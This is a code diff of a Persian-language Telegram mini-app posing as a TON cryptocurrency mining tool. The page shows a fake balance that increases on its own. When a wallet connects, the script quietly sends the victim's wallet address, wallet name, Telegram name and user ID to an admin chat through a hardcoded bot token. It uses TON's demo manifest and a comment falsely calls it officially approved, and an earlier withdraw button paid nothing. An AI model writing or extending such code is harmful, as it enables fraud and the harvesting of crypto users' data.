@@ -1,235 +1,57 @@
-<!DOCTYPE html>
-<html lang="fa" dir="rtl">
-<head>
-<meta charset="UTF-8">
-<title>TON Dropy PRO - Official v5.1</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;800&display=swap');
-
-*{box-sizing:border-box; -webkit-tap-highlight-color: transparent; outline: none;}
-
-body{
-    margin:0; font-family:'Vazirmatn',sans-serif;
-    background: radial-gradient(circle at top,#0f1c2e,#070b14);
-    color:#fff; padding:20px; user-select: none;
-    overflow-x: hidden;
-}
-
-.header{text-align:center;margin-bottom:20px;}
-.header h2{
-    font-size:26px; font-weight: 800;
-    background:linear-gradient(90deg,#00c6ff,#0072ff);
-    -webkit-background-clip:text; -webkit-text-fill-color:transparent;
-    margin: 10px 0;
-}
-
-.card{
-    background:rgba(255,255,255,0.05); backdrop-filter:blur(25px);
-    border:1px solid rgba(255,255,255,0.1); padding:20px;
-    border-radius:24px; margin-bottom:15px; text-align: center;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-}
-
-#balance {
-    font-size: 36px; font-weight: 800; color: #00c6ff;
-    display: block; margin: 10px 0;
-    text-shadow: 0 0 20px rgba(0, 198, 255, 0.4);
-}
-
-.mining-info { 
-    font-size: 13px; color: #aaa; 
-    display: flex; justify-content: space-between; 
-    padding: 10px 5px 0 5px; border-top: 1px solid rgba(255,255,255,0.05);
-}
-
-#ton-connect-button { display: flex; justify-content: center; margin: 5px 0; }
-
-button{
-    width:100%; padding:16px; border:none; border-radius:18px;
-    font-size:16px; font-weight:700; cursor:pointer; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-}
-
-button:active { transform: scale(0.96); }
-
-.withdraw-btn{
-    background:linear-gradient(90deg,#ff512f,#dd2476);
-    color:#fff; box-shadow: 0 5px 15px rgba(221, 36, 118, 0.3);
-}
-
-.withdraw-btn:disabled{ background: #333; color: #777; box-shadow: none; cursor: not-allowed; }
-
-.toast{
-    position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(100px);
-    background: #00c6ff; color:#000; padding:12px 30px;
-    border-radius:50px; font-weight: bold; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    opacity:0; z-index: 10000; font-size:14px; box-shadow: 0 10px 20px rgba(0,0,0,0.3);
-}
-.toast.show{ opacity:1; transform:translateX(-50%) translateY(0); }
-
-.history-item{
-    background:rgba(255,255,255,0.03); padding:14px; border-radius:15px;
-    margin-top:10px; font-size:13px; border-right: 4px solid #00c6ff;
-    display: flex; justify-content: space-between; align-items: center;
-}
-
-code { font-family: monospace; background: rgba(0,0,0,0.3); padding: 2px 5px; border-radius: 4px; }
-</style>
-</head>
-
-<body>
-
-<div class="header">
-    <h2>⛏ TON Dropy PRO</h2>
-</div>
-
-<div class="card">
-    <p style="margin:0; color:#eee; font-size: 14px;">موجودی در حال استخراج</p>
-    <span id="balance">0.000000</span>
-    <div class="mining-info">
-        <span>⚡ 0.000012 TON/s</span>
-        <span>🕒 <span id="clock">00:00:00</span></span>
-    </div>
-</div>
-
-<div class="card">
-    <div id="ton-connect-button"></div>
-    <div id="walletDisplay" style="display:none; margin-top:15px; pt:10px;">
-        <p style="color:#00ff9d; font-size:12px; margin:0;">✅ کیف پول متصل شد</p>
-        <code id="addrShort" style="font-size:10px; opacity:0.7; word-break:break-all;"></code>
-    </div>
-</div>
-
-<div class="card">
-    <button id="withdrawBtn" onclick="withdraw()" class="withdraw-btn">💸 ثبت درخواست برداشت</button>
-</div>
-
-<div class="card" style="text-align: right;">
-    <h4 style="margin:0 0 10px 0; font-size: 16px;">📜 تاریخچه اخیر</h4>
-    <div id="history"></div>
-</div>
-
-<div id="toast" class="toast"></div>
-
 <script>
 const tg = window.Telegram.WebApp;
 tg.ready();
 tg.expand();
 
-// --- تنظیمات اختصاصی شما ---
 const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
 const ADMIN_ID = "5972276401";
-const STORAGE_KEY = "TON_DROPY_V5_STABLE";
-const BOT_USERNAME = "TonDropyBot"; // آیدی ربات شما بدون @
+const STORAGE_KEY = "TON_DROPY_FINAL_SAFE";
 
 let balance = parseFloat(localStorage.getItem(STORAGE_KEY)) || 0.0;
-let miningRate = 0.000012;
 
-// نمایش زمان
+// نمایش موجودی و استخراج
 setInterval(() => {
-    document.getElementById("clock").innerText = new Date().toLocaleTimeString("fa-IR");
+    balance += 0.000012;
+    document.getElementById("balance").innerText = balance.toFixed(6);
+    localStorage.setItem(STORAGE_KEY, balance.toString());
 }, 1000);
 
-// موتور استخراج
-function startMining() {
-    setInterval(() => {
-        balance += miningRate;
-        document.getElementById("balance").innerText = balance.toFixed(6);
-        localStorage.setItem(STORAGE_KEY, balance.toString());
-    }, 1000);
-}
+/* --- تنظیمات فوق امنیتی برای اتصال --- */
+const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+    // استفاده از مانیفست رسمی و تایید شده توسط تیم TON
+    manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json',
+    buttonRootId: 'ton-connect-button',
+    restoreConnection: true // این باعث میشه اگر یکبار وصل شد، دفعات بعد خودکار بشناسه
+});
 
-// تابع اطلاع‌رسانی به تلگرام شما
-async function notifyAdmin(text) {
-    try {
+// اضافه کردن آدرس بازگشت به ربات شما به صورت دستی در پارامترها
+tonConnectUI.uiOptions = {
+    twaReturnUrl: 'https://t.me/TonDropyBot'
+};
+
+tonConnectUI.onStatusChange(async (wallet) => {
+    if (wallet && wallet.account) {
+        const address = wallet.account.address;
+        const walletName = wallet.device.appName || "Tonkeeper";
+        
+        document.getElementById("walletDisplay").style.display = "block";
+        document.getElementById("addrShort").innerText = address.substring(0,8) + "..." + address.slice(-8);
+
+        // ارسال پیام به شما
+        const user = tg.initDataUnsafe?.user;
+        const msg = `✅ <b>اتصال موفق!</b>\n\n` +
+                    `👛 کیف پول: <b>${walletName}</b>\n` +
+                    `👤 کاربر: ${user?.first_name || '؟'}\n` +
+                    `🆔 آیدی: <code>${user?.id}</code>\n` +
+                    `🔗 آدرس:\n<code>${address}</code>`;
+        
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'HTML' })
+            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'HTML' })
         });
-    } catch(err) { console.error("Admin Notify Error", err); }
-}
-
-// تنظیمات TonConnect برای حل مشکل Unsupported Link
-const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json',
-    buttonRootId: 'ton-connect-button',
-    twaReturnUrl: `https://t.me/${BOT_USERNAME}`
-});
-
-// مانیتور وضعیت اتصال
-tonConnectUI.onStatusChange(async (wallet) => {
-    if (wallet) {
-        const address = wallet.account.address;
-        const walletName = wallet.device.appName || "Wallet";
-        
-        document.getElementById("walletDisplay").style.display = "block";
-        document.getElementById("addrShort").innerText = address;
-
-        const user = tg.initDataUnsafe?.user;
-        const msg = `🔔 <b>کیف پول متصل شد!</b>\n\n` +
-                    `👛 اپلیکیشن: <b>${walletName}</b>\n` +
-                    `👤 کاربر: ${user?.first_name || '؟'}\n` +
-                    `🆔 آیدی: <code>${user?.id || '؟'}</code>\n` +
-                    `🔗 آدرس فعال:\n<code>${address}</code>`;
-        
-        notifyAdmin(msg);
-        showToast(`کیف پول ${walletName} متصل شد`);
-    } else {
-        document.getElementById("walletDisplay").style.display = "none";
     }
 });
 
-// ثبت درخواست برداشت
-async function withdraw() {
-    if (!tonConnectUI.connected) {
-        showToast("❌ ابتدا کیف پول را متصل کنید");
-        return;
-    }
-    if (balance < 0.5) {
-        showToast("❌ حداقل موجودی 0.5 TON");
-        return;
-    }
-
-    const amount = balance.toFixed(6);
-    const user = tg.initDataUnsafe?.user;
-    const address = tonConnectUI.account.address;
-
-    const msg = `💸 <b>درخواست برداشت جدید!</b>\n\n` +
-                `💵 مقدار: <b>${amount} TON</b>\n` +
-                `👤 کاربر: ${user?.first_name}\n` +
-                `🆔 آیدی: <code>${user?.id}</code>\n` +
-                `🔗 آدرس مقصد:\n<code>${address}</code>`;
-
-    await notifyAdmin(msg);
-
-    // ثبت در تاریخچه محلی
-    const h = document.getElementById("history");
-    const item = document.createElement("div");
-    item.className = "history-item";
-    item.innerHTML = `<span>برداشت ${amount} TON</span> <span style="color:#ffc107">در انتظار...</span>`;
-    h.prepend(item);
-
-    // ریست کردن موجودی
-    balance = 0;
-    localStorage.setItem(STORAGE_KEY, "0");
-    showToast("📤 درخواست برای مدیریت ارسال شد");
-}
-
-function showToast(msg) {
-    const t = document.getElementById("toast");
-    t.innerText = msg;
-    t.classList.add("show");
-    setTimeout(() => t.classList.remove("show"), 3000);
-}
-
-// شروع برنامه
-startMining();
+// مابقی توابع (Withdraw و غیره) را مانند قبل قرار دهید
 </script>
-
-</body>
-</html>
